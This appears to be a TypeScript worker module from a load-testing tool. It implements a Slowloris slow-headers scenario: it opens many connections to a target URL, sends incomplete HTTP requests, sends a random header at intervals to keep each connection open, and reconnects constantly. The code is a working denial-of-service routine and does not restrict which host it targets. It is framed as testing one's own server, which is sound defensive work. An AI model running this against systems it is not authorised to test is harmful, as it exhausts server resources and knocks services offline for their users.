import net from 'net';
import tls from 'tls';
import { URL } from 'url';
import { workerData, parentPort } from 'worker_threads';
import Metrics from '../core/metrics';
import utils from '../utils';
import { SlowlorisWorkerData, ReportMessage, WorkerMessage } from '../types';

/**
 * Slowloris-style slow-headers scenario.
 *
 * Opens many connections and trickles partial HTTP headers without ever
 * completing the request, periodically sending one more header line to keep
 * each connection alive. Measures how well your own server defends against
 * slow-connection resource exhaustion.
 */
if (!parentPort) throw new Error('slowloris-worker must run as a worker thread');
const messagePort = parentPort;

const data = workerData as SlowlorisWorkerData;
const {
  target, concurrency, headerIntervalMs, timeoutMs,
} = data;

const url = new URL(target);
const isTls = url.protocol === 'https:';
const defaultPort = isTls ? 443 : 80;
const port = url.port ? Number(url.port) : defaultPort;
const host = url.hostname;

const metrics = new Metrics();
let running = true;
const sockets = new Set<net.Socket>();

function openConnection(): void {
  if (!running) return;
  const start = process.hrtime.bigint();
  let connected = false;
  let settled = false;

  const socket: net.Socket = isTls
    ? tls.connect({
      host, port, servername: host, rejectUnauthorized: false,
    })
    : net.connect({ host, port });

  const onConnect = (): void => {
    connected = true;
    const ms = Number(process.hrtime.bigint() - start) / 1e6;
    metrics.recordSuccess(ms, 'open');
    // Send an incomplete request: request line + a couple of headers, but no
    // terminating blank line, so the server keeps waiting for more.
    socket.write(`GET ${url.pathname || '/'}?${Date.now()} HTTP/1.1\r\n`);
    socket.write(`Host: ${host}\r\n`);
    socket.write(`User-Agent: ${utils.randomUserAgent}\r\n`);
    socket.write('Accept: */*\r\n');
  };

  socket.on(isTls ? 'secureConnect' : 'connect', onConnect);
  socket.setTimeout(timeoutMs);

  // Keep dribbling a bogus-but-valid header to hold the connection open.
  const keepAlive = setInterval(() => {
    if (socket.destroyed) return;
    socket.write(`X-Keep-${Date.now()}: ${Math.random().toString(36).slice(2)}\r\n`);
  }, headerIntervalMs);

  // Settle once per connection, record the outcome, and reconnect (with a
  // small backoff on failure) to keep pressure constant during the test.
  const settle = (reason: string): void => {
    if (settled) return;
    settled = true;
    clearInterval(keepAlive);
    sockets.delete(socket);
    if (!socket.destroyed) socket.destroy();
    metrics.recordError(connected ? reason : `connect_failed:${reason}`);
    if (running) setTimeout(openConnection, connected ? 0 : 250);
  };

  socket.on('timeout', () => settle('timeout'));
  socket.on('error', (err: NodeJS.ErrnoException) => settle(err.code || err.message));
  socket.on('close', () => settle('closed'));

  sockets.add(socket);
}

messagePort.on('message', (msg: WorkerMessage) => {
  if (msg && msg.type === 'stop') {
    running = false;
    sockets.forEach((s) => { if (!s.destroyed) s.destroy(); });
    const report: ReportMessage = { type: 'report', snapshot: metrics.toSnapshot() };
    messagePort.postMessage(report);
  }
});

for (let i = 0; i < concurrency; i += 1) {
  openConnection();
}
